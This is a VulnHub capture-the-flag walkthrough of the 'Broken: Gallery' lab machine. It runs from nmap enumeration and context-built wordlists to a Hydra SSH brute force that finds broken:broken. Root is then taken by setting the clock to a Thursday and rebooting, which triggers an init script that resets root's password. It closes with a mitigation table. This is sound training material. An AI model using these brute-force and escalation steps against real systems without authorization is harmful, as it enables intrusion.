# 🖼️ Broken: Gallery — VulnHub Walkthrough

> **Platform:** VulnHub | **URL:** https://www.vulnhub.com/entry/broken-gallery,344/  
> **Difficulty:** Beginner–Intermediate | **Author of writeup:** [@cyberchi3f](https://github.com/cyberchi3f)  
> **Tagline:** *Break it ethically. Fix it permanently.*

---

## 📋 Table of Contents

1. [Machine Overview](#-machine-overview)
2. [Attack Chain Summary](#-attack-chain-summary)
3. [Tools Used](#-tools-used)
4. [Phase 1 — Host Discovery](#phase-1--host-discovery)
5. [Phase 2 — Service Enumeration](#phase-2--service-enumeration)
6. [Phase 3 — Web Enumeration](#phase-3--web-enumeration)
7. [Phase 4 — Steganography Analysis](#phase-4--steganography-analysis)
8. [Phase 5 — Wordlist Crafting](#phase-5--wordlist-crafting)
9. [Phase 6 — SSH Brute Force](#phase-6--ssh-brute-force)
10. [Phase 7 — Initial Access](#phase-7--initial-access)
11. [Phase 8 — Post-Exploitation Enumeration](#phase-8--post-exploitation-enumeration)
12. [Phase 9 — Privilege Escalation](#phase-9--privilege-escalation)
13. [Key Takeaways](#-key-takeaways)

---

## 🖥️ Machine Overview

| Field | Details |
|---|---|
| Machine Name | Broken: Gallery |
| Target IP | `172.29.209.95` |
| Attacker IP | `172.29.209.47` (Kali Linux) |
| OS (Target) | Ubuntu 16.04 LTS (Linux 4.4.0-21-generic x86_64) |
| Open Ports | 22 (SSH), 80 (HTTP) |
| Key Services | OpenSSH 7.2p2, Apache httpd 2.4.18 |

---

## ⚡ Attack Chain Summary

```
Host Discovery (netdiscover)
        ↓
Service Enumeration (nmap -A)
        ↓
Web Enumeration → Apache Directory Listing → Image Gallery
        ↓
Steganography Analysis (strings, steghide) → No hidden data
        ↓
Wordlist Crafting from filenames → rsmangler expansion
        ↓
SSH Brute Force (Hydra) → Credentials: broken:broken
        ↓
Initial Access via SSH
        ↓
Post-Exploitation: bash history, .sudo_as_admin_successful
        ↓
Privilege Escalation via password-policy.sh + timedatectl + sudo reboot
        ↓
Root Access (TodayIsAgoodDay)
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `netdiscover` | ARP-based host discovery |
| `nmap` | Service/version enumeration, OS detection |
| Browser | Web enumeration (Apache directory listing) |
| `wget` | File download from web server |
| `strings` | Extract printable strings from binary files |
| `steghide` | Steganography detection and extraction |
| `sed` | Stream editing for wordlist transformation |
| `rsmangler` | Wordlist mangling and password mutation |
| `hydra` | SSH credential brute-forcing |
| `ssh` | Remote access |
| `timedatectl` | System date/time manipulation |

---

## Phase 1 — Host Discovery

With the VM booted and running on the same NAT subnet, the first step is identifying the target IP using passive ARP scanning.

```bash
netdiscover -r 172.27.0.0/16
```

**Output:**

```
IP              At MAC Address     Count   Len    MAC Vendor / Hostname
172.29.209.95   00:0c:29:61:a4:25    2     120    VMware, Inc.
172.29.209.47   fa:3d:79:95:28:87    8     480    Unknown vendor
```

> **Note:** `172.29.209.95` is identified as a VMware guest — confirmed as our target. `172.29.209.47` is our Kali attack machine.

---

## Phase 2 — Service Enumeration

With the target IP confirmed, an aggressive Nmap scan is used to fingerprint services, OS details, and enumerate HTTP content.

```bash
nmap -A 172.29.209.95
```

**Key findings:**

```
PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http     Apache httpd 2.4.18
```

**HTTP directory listing exposed by Nmap:**

```
gallery.html
README.md
img_5terre.jpg    (259K)
img_forest.jpg    (114K)
img_lights.jpg    (663K)
img_mountains.jpg (8.4K)
```

**OS Fingerprint:** Linux 3.2–4.14 (Ubuntu 16.04 confirmed post-login)  
**MAC Address:** `00:0C:29:61:A4:25` (VMware)

> ⚠️ **Finding:** Apache is running with directory listing enabled (`-Indexes` not set), exposing all web root files. This is a misconfiguration that aids enumeration significantly.

---

## Phase 3 — Web Enumeration

Navigating to `http://172.29.209.95` in the browser confirms the Apache directory listing with the same files Nmap enumerated.

**Visible files:**

- `README.md` — 55K (could contain hints)
- `gallery.html` — 1.1K (the image gallery page)
- `img_5terre.jpg`, `img_forest.jpg`, `img_lights.jpg`, `img_mountains.jpg`

All files are dated **2019-08-09**, providing a timestamp context that later becomes relevant during privilege escalation.

---

## Phase 4 — Steganography Analysis

The presence of multiple image files on a vulnerable machine is a classic indicator of steganography. Investigation follows a structured approach.

### Step 4.1 — Download Images

```bash
cd ~/Pictures
wget http://172.29.209.95/img_5terre.jpg
wget http://172.29.209.95/img_forest.jpg
wget http://172.29.209.95/img_lights.jpg
wget http://172.29.209.95/img_mountains.jpg
ls
```

### Step 4.2 — Extract Printable Strings

```bash
strings *.jpg | less
```

The output returns raw JPEG metadata and binary artifact strings — no clear embedded flags or credentials visible in plaintext.

### Step 4.3 — Strip Filenames for Reference

```bash
ls | grep .jpg | sed s/\.jpg//
```

**Output:**
```
img_5terre
img_forest
img_lights
img_mountains
```

### Step 4.4 — Steghide Extraction Attempts

```bash
steghide extract -sf img_5terre.jpg
steghide extract -sf img_forest.jpg
steghide extract -sf img_lights.jpg
steghide extract -sf img_mountains.jpg
```

**Result:** All four return: `steghide: could not extract any data with that passphrase!`

> 💡 **Pivot point:** Steganography with a known passphrase might succeed, but for now we have no passphrase. The filenames themselves become our next wordlist seed — a CTF methodology pivot.

---

## Phase 5 — Wordlist Crafting

Rather than using generic wordlists like `rockyou.txt`, the attack surface itself — the page names and image filenames — is used to build a targeted wordlist.

### Step 5.1 — Build Initial Wordlist from Context

The filenames and page names from the web server provide natural candidates:

```bash
# Create initial wordlist from known names
cat > wordlist3 << EOF
broken
gallery
5terre
forest
lights
mountains
EOF
```

Or via command pipeline:

```bash
cat wordlists | sed s/img_// > wordlist3
vi wordlist3
```

**Contents of `wordlist3`:**
```
broken
gallery
5terre
forest
lights
mountains
```

> 📌 **Note:** `broken` is included because it is a common CTF convention to name the low-privilege user after the machine name.

### Step 5.2 — Mangle the Wordlist with rsmangler

`rsmangler` mutates a small wordlist into a large dictionary using case variation, number appending, character substitution, punctuation injection, and more.

```bash
rsmangler -m 6 -x 8 -r -d -e -i --punctuation -y -a -C --pna --nb --space --allow-duplicate -f wordlist3 -o mangled
```

**Output:**
```
5 words in a start list creates a dictionary of nearly 100,000 words.
You have 6 words in your list, are you sure you wish to continue?
Hit ctrl-c to abort

5 4 3 2 1
```

This generates the `mangled` file — a large mutated password dictionary built from context-aware seed words.

---

## Phase 6 — SSH Brute Force

### Attempt 1 — Using Original Wordlist (Failed)

```bash
hydra -L wordlists -P wordlists 172.29.209.95 ssh
```

**Result:** `1 of 1 target completed, 0 valid password found`  
16 login attempts across 4 usernames × 4 passwords — no hits.

### Attempt 2 — Using Crafted Wordlist3 (Success ✅)

```bash
hydra -L wordlist3 -P wordlist3 172.29.209.95 ssh
```

**Output:**
```
[DATA] attacking ssh://172.29.209.95:22/
[22][ssh] host: 172.29.209.95  login: broken  password: broken
1 of 1 target successfully completed, 1 valid password found
```

> 🎯 **Credentials found:** `broken:broken`  
> The user account uses its own username as its password — a trivial but extremely common misconfiguration.

---

## Phase 7 — Initial Access

```bash
ssh broken@172.29.209.95
```

SSH prompts for host key verification (first connection) — accepted. Password entered: `broken`

**Banner:**
```
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)

762 packages can be updated.
458 updates are security updates.

New release '18.04.6 LTS' available.

broken@ubuntu:~$
```

> ⚠️ **Observation:** 762 pending package updates including 458 security patches indicates a severely outdated and unpatched system — a significant attack surface in a real-world scenario.

---

## Phase 8 — Post-Exploitation Enumeration

### Step 8.1 — Directory Listing

```bash
ls -lah
```

Notable files in `/home/broken`:

```
-rw——————   .bash_history     (3.6K — Jan 1 2018)
-rw-r--r--  .sudo_as_admin_successful   (0 bytes)
drwxr-xr-x  Pictures/
```

> 🔑 **Key finding:** `.sudo_as_admin_successful` exists — this file is created by `sudo` when a user in the `sudo` group successfully runs a command. It confirms `broken` is in the `sudo` group.

### Step 8.2 — Bash History Review

```bash
history
```

Partial history (lines 167–205) reveals prior root-level activity:

```
169   sudo vi /etc/sudoers
174   su - root
178   su - root
180   timedatectl set-time '2019-08-08 13:45'
183   cat /etc/init.d/password-policy.sh
184   ./password-policy.sh
186   reboot
188   su - root
190   timedatectl set-time '2018-01-01 00:00'
194   ./password-policy.sh
195   su - root
198   sudo vi /etc/issue
```

> 💡 **Critical clue:** The history shows `timedatectl set-time '2019-08-08 13:45'` followed by running `password-policy.sh`. 2019-08-08 is a **Thursday** (day 4 in `%u` format). This strongly hints at a time-based privilege escalation path.

### Step 8.3 — Locate and Inspect the Password Policy Script

```bash
locate password-policy.sh
# Output: /etc/init.d/password-policy.sh

cat /etc/init.d/password-policy.sh
```

**Script contents:**

```bash
#!/bin/bash

DAYOFWEEK=$(date +"%u")
echo DAYOFWEEK: $DAYOFWEEK

if [ "$DAYOFWEEK" -eq 4 ]
then
        sudo sh -c 'echo root:TodayIsAgoodDay | chpasswd'
fi

#if [ "$DAYOFWEEK" = 4 ]
```

> 🔑 **Vulnerability identified:** This init script runs as root at boot time (via `/etc/init.d/`). If the system day is **Thursday (day 4)**, it sets the root password to `TodayIsAgoodDay`.

### Step 8.4 — Verify Current Day

```bash
date +"%u"
# Output: 2  (Tuesday)
```

The script will not trigger automatically — today is not Thursday. We need to manipulate the system clock and force a reboot.

---

## Phase 9 — Privilege Escalation

### Strategy

Since `password-policy.sh` is in `/etc/init.d/`, it executes on system boot **as root**. The exploit chain is:

1. Change the system date to a **Thursday** using `timedatectl`
2. Reboot the machine using `sudo reboot` (broken is in the sudo group)
3. On boot, `/etc/init.d/password-policy.sh` runs as root
4. The script detects Thursday → executes `echo root:TodayIsAgoodDay | chpasswd`
5. Root password is now `TodayIsAgoodDay`

### Step 9.1 — Confirm sudo Reboot Privilege

```bash
sudo reboot
```

Result: Connection closed — reboot confirmed. This validates that `broken` can reboot the machine via sudo.

### Step 9.2 — Attempt Direct Script Execution (Blocked)

```bash
sudo sh /etc/init.d/password-policy.sh
# Sorry, user broken is not allowed to execute '/bin/sh /etc/init.d/password-policy.sh' as root on ubuntu.
```

Direct execution is blocked by sudoers policy — the init.d mechanism is the intended trigger.

### Step 9.3 — Set Date to Thursday and Reboot

```bash
# 2019-08-08 was a Thursday (day 4)
timedatectl set-time '2019-08-08 13:45'
sudo reboot
```

On reboot, the system boots into Thursday. The `/etc/init.d/password-policy.sh` script executes as root, evaluates `DAYOFWEEK = 4`, and runs:

```bash
echo root:TodayIsAgoodDay | chpasswd
```

### Step 9.4 — Root Access

After the system reboots, SSH back and escalate:

```bash
ssh broken@172.29.209.95
# Enter password: broken

su - root
# Password: TodayIsAgoodDay

root@ubuntu:~#
```

> 🚩 **Root achieved!** Full system compromise complete.

---

## 🔑 Key Takeaways

| # | Vulnerability | Risk | Mitigation |
|---|---|---|---|
| 1 | Apache directory listing enabled | Medium | Add `Options -Indexes` to Apache config |
| 2 | Trivial credentials (`broken:broken`) | Critical | Enforce strong password policy; disable password-based SSH in favour of key auth |
| 3 | Password-policy.sh with hardcoded root credential | Critical | Remove init scripts that set credentials; use proper PAM/secrets management |
| 4 | User can manipulate system time | High | Restrict `timedatectl` to root; use NTP with integrity enforcement |
| 5 | 762 unpatched packages (458 security) | High | Establish patch management cadence; automate security updates |
| 6 | SSH running with legacy key exchange (no PQC) | Medium | Upgrade OpenSSH; enable post-quantum key exchange algorithms |
| 7 | OpenSSH 7.2p2 — EOL version | High | Upgrade to a supported OpenSSH release |

---

## 📸 Screenshots

All screenshots are timestamped from the live engagement session on **2026-05-19** and cover each phase of the attack chain end-to-end.

---

*Walkthrough by [@cyberchi3f](https://github.com/cyberchi3f) — Break it ethically. Fix it permanently.*  
*DexAShield Technologies | Lagos, Nigeria*
